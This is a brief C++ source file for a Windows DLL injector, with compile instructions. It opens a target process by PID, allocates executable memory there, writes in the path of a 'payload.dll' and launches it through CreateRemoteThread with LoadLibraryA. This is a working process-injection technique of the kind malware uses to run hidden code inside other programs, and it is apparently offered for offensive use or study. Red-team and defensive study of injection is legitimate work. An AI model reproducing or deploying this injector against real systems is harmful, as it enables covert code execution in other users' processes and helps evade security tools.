// g++ -o "C:\Users\user\Desktop\injector.exe" injector.cpp -fpermissive

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

char dllPath[] = "C:\\Users\\user\\Desktop\\payload.dll";
unsigned int dllLen = sizeof(dllPath) + 1;

int main(int argc, char *argv[])
{
    HANDLE processHandle;
    HANDLE remoteThread;
    LPVOID remoteBuffer;

    // handle to kernel32 and pass it to GetProcAddress
    HMODULE hKernel32 = GetModuleHandle("Kernel32");
    VOID *loadLibraryA = GetProcAddress(hKernel32, "LoadLibraryA");

    int pid = atoi(argv[1]);

    if (pid == 0)
    {
        printf("PID not found\n");
        return -1;
    }

    printf("PID: %i\n", pid);

    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));

    // allocate memory buffer for remote process
    remoteBuffer = VirtualAllocEx(processHandle, NULL, dllLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

    // "copy" DLL between processes
    WriteProcessMemory(processHandle, remoteBuffer, dllPath, dllLen, NULL);

    // our process start new thread
    remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryA, remoteBuffer, 0, NULL);
    CloseHandle(processHandle);
    return 0;
}
